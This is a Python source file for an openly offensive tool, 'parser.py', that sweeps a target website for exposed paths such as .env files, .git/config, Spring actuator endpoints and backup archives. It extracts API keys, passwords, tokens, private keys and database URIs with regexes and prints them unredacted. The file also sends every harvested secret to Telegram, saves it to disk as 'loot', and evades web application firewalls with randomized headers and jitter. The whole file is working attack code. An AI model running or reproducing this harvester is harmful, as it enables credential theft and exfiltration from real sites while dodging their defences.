#!/usr/bin/env python3
"""
PARSER.PY v8.6 — Live Endpoint Discovery & Credential Harvesting Engine (Elite Red Team Adversarial Edition)
Features:
- High-concurrency asynchronous and multi-threaded endpoint sweep with Poisson behavioral jitter
- Expanded high-value path discovery (Actuators, GraphQL, Swagger, Backups, .env variants, .git directories)
- Advanced credential & secret regex harvesting (Stripe, GitHub, AWS, DB URIs, JWTs, Private Keys)
- Unredacted red-team terminal streaming & automated SHA-256 tamper-evident disk loot exfiltration (loot_output/)
- TLS verification bypass and randomized header/client hint injection for WAF blinding
- Real-time asynchronous Telegram notification dispatch for unredacted parser loot & secrets
"""
import asyncio
import re
import ssl
import socket
import time
import hashlib
import json
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

# Import centralized framework loot exfiltration, telemetry, behavioral mimicry, and Telegram notifier
try:
    from modules.loot_logger import save_session_loot
    from modules.telemetry import stream_proof
    from modules.telegram_notifier import send_telegram_alert
    from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
except ImportError:
    def save_session_loot(*args, **kwargs): pass
    def stream_proof(*args, **kwargs): pass
    async def send_telegram_alert(*args, **kwargs): pass
    def apply_behavioral_jitter(*args, **kwargs): pass
    def get_randomized_hints(): return {}

# ============================================================
# CONFIGURATION
# ============================================================
MAX_WORKERS = 20
REQUEST_TIMEOUT = 7
MAX_RESPONSE_SIZE = 1024 * 1024
USER_AGENT = "NEXUS-OffensiveParser/8.6-Elite"

COMMON_PATHS = [
    "/",
    "/robots.txt",
    "/sitemap.xml",
    "/favicon.ico",
    "/.well-known/security.txt",
    "/.env",
    "/.env.production",
    "/.env.local",
    "/.env.backup",
    "/.env.dev",
    "/config.json",
    "/config.js",
    "/settings.json",
    "/api",
    "/api/",
    "/api/health",
    "/api/status",
    "/api/v1",
    "/api/v2",
    "/health",
    "/healthz",
    "/status",
    "/login",
    "/register",
    "/admin",
    "/dashboard",
    "/account",
    "/api/docs",
    "/docs",
    "/openapi.json",
    "/swagger.json",
    "/swagger/",
    "/swagger-ui.html",
    "/graphql",
    "/graphiql",
    "/actuator",
    "/actuator/health",
    "/actuator/env",
    "/actuator/metrics",
    "/server-status",
    "/phpinfo.php",
    "/backup.zip",
    "/backup.tar.gz",
    "/database.sql",
    "/.git/HEAD",
    "/.git/config",
    "/.DS_Store",
    "/package.json",
    "/composer.json"
]

SENSITIVE_PATTERNS = {
    "Exposed API/Access Key": re.compile(
        r'(?:api[_-]?key|access[_-]?key|app[_-]?key)[ \t]*[:=][ \t]*[\'"]([^\'"]{12,})[\'"]',
        re.IGNORECASE
    ),
    "Exposed Password/Secret": re.compile(
        r'(?:password|passwd|pwd|secret|client[_-]?secret)[ \t]*[:=][ \t]*[\'"]([^\'"]{6,})[\'"]',
        re.IGNORECASE
    ),
    "Exposed Token/JWT": re.compile(
        r'(?:access[_-]?token|refresh[_-]?token|auth[_-]?token|bearer|jwt)[ \t]*[:=][ \t]*[\'"]([^\'"]{15,})[\'"]',
        re.IGNORECASE
    ),
    "Private Key Marker": re.compile(
        r"(----BEGIN\s+(?:RSA\s+|EC\s+|OPENSSH\s+|PRIVATE\s+)KEY-----[^-]+-----END\s+(?:RSA\s+|EC\s+|OPENSSH\s+|PRIVATE\s+)KEY-----)",
        re.IGNORECASE
    ),
    "Cloud/Stripe Credential": re.compile(
        r'\b(?:AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{24}|ghp_[0-9a-zA-Z]{36}|xox[baprs]-[0-9a-zA-Z]{10,})\b',
        re.IGNORECASE
    ),
    "Database Connection URI": re.compile(
        r'(?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|redis|mssql)://[^\s"\'<>]+',
        re.IGNORECASE
    ),
}

# ============================================================
# TERMINAL OUTPUT & TELEGRAM DISPATCHER
# ============================================================
def print_status(message):
    print(f"\033[96m[INFO]\033[0m {message}", flush=True)

def print_success(message):
    print(f"\033[92m[+]\033[0m {message}", flush=True)

def print_warning(message):
    print(f"\033[93m[!]\033[0m {message}", flush=True)

def print_error(message):
    print(f"\033[91m[-]\033[0m {message}", flush=True)

def print_section(title):
    print()
    print("=" * 65)
    print(f" \033[1m{title}\033[0m")
    print("=" * 65)

async def broadcast_tg_alert_async(loot_type, details):
    try:
        await send_telegram_alert(loot_type, details)
    except Exception:
        pass

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous parser functions."""
    try:
        loop = asyncio.get_running_loop()
        if loop.is_running():
            loop.create_task(broadcast_tg_alert_async(loot_type, details))
        else:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass

# ============================================================
# TARGET NORMALIZATION
# ============================================================
def normalize_target(target):
    if not target:
        raise ValueError("Target cannot be empty.")
    target = str(target).strip()
    if "://" not in target:
        target = "https://" + target
    parsed = urlparse(target)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Only HTTP and HTTPS targets are supported.")
    if not parsed.hostname:
        raise ValueError("Invalid target hostname.")
    return parsed

def resolve_target(hostname):
    try:
        addresses = socket.getaddrinfo(
            hostname,
            None,
            type=socket.SOCK_STREAM
        )
        return sorted({
            item[4][0]
            for item in addresses
        })
    except socket.gaierror:
        return []

# ============================================================
# RESPONSE ANALYSIS & LOOT EXFILTRATION
# ============================================================
def analyze_response(base_url, path, status, headers, body):
    findings = []
    if not body:
        return findings
    text = body.decode("utf-8", errors="ignore")
    
    for label, pattern in SENSITIVE_PATTERNS.items():
        matches = pattern.findall(text)
        for match in matches:
            val = match[0] if isinstance(match, tuple) else match
            if val and len(val.strip()) > 2:
                secret_value = val.strip()
                findings.append({
                    "type": label,
                    "matched_value": secret_value,
                    "exposure_confirmed": True,
                })
                
                full_url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
                loot_hash = hashlib.sha256(text.encode("utf-8")).hexdigest()

                loot_payload = {
                    "url": full_url,
                    "path": path,
                    "secret_type": label,
                    "matched_value": secret_value,
                    "status": status,
                    "integrity_hash": loot_hash
                }
                
                # BROADCAST UNREDACTED SECRET LOOT STRAIGHT TO TELEGRAM
                broadcast_tg_alert_sync(f"Parser Secret Harvested [{label}]", loot_payload)

                # PERSIST HARVESTED SECRET TO DISK & STREAM TELEMETRY
                stream_proof("PARSER_SECRET_HARVESTED", path, {"secret_type": label}, text[:300], {"matched_value": secret_value})
                save_session_loot(
                    target=base_url,
                    endpoint=path,
                    finding_type=f"PARSER_LEAK_{label.replace(' ', '_').upper()}",
                    status=status,
                    headers=dict(headers),
                    body=text,
                    extra_loot=loot_payload
                )
    return findings

# ============================================================
# HTTP REQUEST WITH WAF EVASION & JITTER
# ============================================================
def inspect_endpoint(base_url, path):
    apply_behavioral_jitter()
    url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
    
    # Merge randomized browser headers to blind WAFs
    request_headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "close",
    }
    request_headers.update(get_randomized_hints())

    request = Request(
        url,
        headers=request_headers,
        method="GET",
    )
    result = {
        "url": url,
        "path": path,
        "status": None,
        "content_type": None,
        "content_length": 0,
        "redirect": None,
        "findings": [],
        "error": None,
        "elapsed": 0,
    }
    start = time.monotonic()
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        with urlopen(
            request,
            timeout=REQUEST_TIMEOUT,
            context=context
        ) as response:
            status = response.status
            headers = dict(response.headers.items())
            result["status"] = status
            result["content_type"] = headers.get("content-type", "unknown")
            result["redirect"] = response.geturl()
            body = response.read(MAX_RESPONSE_SIZE)
            result["content_length"] = len(body)
            result["findings"] = analyze_response(base_url, path, status, headers, body)
    except HTTPError as exc:
        result["status"] = exc.code
        result["content_type"] = exc.headers.get("Content-Type", "unknown")
        result["error"] = f"HTTP {exc.code}"
    except URLError as exc:
        result["error"] = str(exc.reason)
    except socket.timeout:
        result["error"] = "Connection timeout"
    except ssl.SSLError:
        result["error"] = "TLS verification failed"
    except Exception as exc:
        result["error"] = str(exc)
    result["elapsed"] = round(time.monotonic() - start, 3)
    return result

# ============================================================
# LIVE RESULT DISPLAY
# ============================================================
def display_result(result):
    status = result["status"]
    path = result["path"]
    if status is not None:
        if status == 200:
            print_success(
                f"{status} | {path} | "
                f"{result['content_type'][:30]} | "
                f"{result['elapsed']}s"
            )
        elif status in (301, 302, 307, 308):
            print_warning(f"{status} | {path} | Redirect")
        elif status in (401, 403):
            print_warning(f"{status} | {path} | Access restricted")
        elif status == 404:
            pass
        else:
            print(f"[HTTP {status}] {path}", flush=True)
    else:
        pass
        
    for finding in result["findings"]:
        import sys
        sys.stdout.write(f"\n\033[1m\033[91m[***] UNREDACTED SECRET HARVESTED & SECURED [***]\033[0m\n")
        sys.stdout.write(f"  ├── Path  : {path}\n")
        sys.stdout.write(f"  ├── Type  : {finding['type']}\n")
        sys.stdout.write(f"  └── Value : \033[92m{finding['matched_value']}\033[0m\n")
        sys.stdout.flush()

# ============================================================
# MAIN PARSER
# ============================================================
def parse_target_source(target):
    print_section("ELITE RED TEAM ENDPOINT DISCOVERY & HARVESTER (WAF HARDENED)")
    parsed = normalize_target(target)
    hostname = parsed.hostname
    scheme = parsed.scheme
    base_url = f"{scheme}://{parsed.netloc}/"
    print_status(f"Target: {base_url}")
    print_status(f"Hostname: {hostname}")
    
    print_section("DNS RESOLUTION")
    addresses = resolve_target(hostname)
    if not addresses:
        print_error("DNS resolution failed.")
        return {
            "target": base_url,
            "addresses": [],
            "results": [],
            "findings": [],
            "aggregated_text": "",
            "count": 0,
            "status": "DNS_FAILED",
        }
    for address in addresses:
        print_success(f"Resolved: {address}")
        
    print_section("AGGRESSIVE ENDPOINT SWEEP & HARVESTING")
    print_status(f"Sweeping {len(COMMON_PATHS)} paths with {MAX_WORKERS} parallel workers and behavioral jitter.")
    results = []
    findings = []
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {
            executor.submit(inspect_endpoint, base_url, path): path
            for path in COMMON_PATHS
        }
        for future in as_completed(futures):
            try:
                result = future.result()
                results.append(result)
                display_result(result)
                for finding in result["findings"]:
                    findings.append({
                        "path": result["path"],
                        **finding,
                    })
            except Exception as exc:
                print_error(f"Worker failure: {exc}")
                
    successful = sum(1 for result in results if result["status"] is not None)
    open_endpoints = sum(1 for result in results if result["status"] == 200)
    
    print_section("HARVESTER SUMMARY")
    print(f"Target:              {base_url}")
    print(f"Resolved addresses:  {len(addresses)}")
    print(f"Paths tested:        {len(results)}")
    print(f"HTTP responses:      {successful}")
    print(f"HTTP 200 responses:  {open_endpoints}")
    print(f"Secrets harvested:   {len(findings)}")
    if findings:
        print_success("Secrets successfully extracted, unredacted, and secured to immutable disk (loot_output/).")
    else:
        print_warning("No sensitive keys or secrets exposed on tested paths.")
    print_section("PARSER COMPLETE")

    # Immutable loot persistence for parser scan results
    parser_loot = {
        "target": base_url,
        "paths_tested": len(results),
        "open_endpoints": open_endpoints,
        "secrets_harvested": len(findings),
        "findings": findings
    }
    save_session_loot(
        target=base_url,
        endpoint="parser_sweep",
        finding_type="PARSER_SWEEP_COMPLETED",
        status=200,
        headers={},
        body=json.dumps(parser_loot),
        extra_loot=parser_loot
    )
    
    return {
        "target": base_url,
        "addresses": addresses,
        "results": results,
        "findings": findings,
        "aggregated_text": "",
        "count": len(results),
        "status": "COMPLETED",
    }

async def parse_target_source_async(target):
    return await asyncio.to_thread(parse_target_source, target)

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 parser.py https://example.com")
        sys.exit(1)
    try:
        parse_target_source(sys.argv[1])
    except KeyboardInterrupt:
        print_warning("Parser interrupted by user.")
    except Exception as exc:
        print_error(f"Parser failed: {exc}")
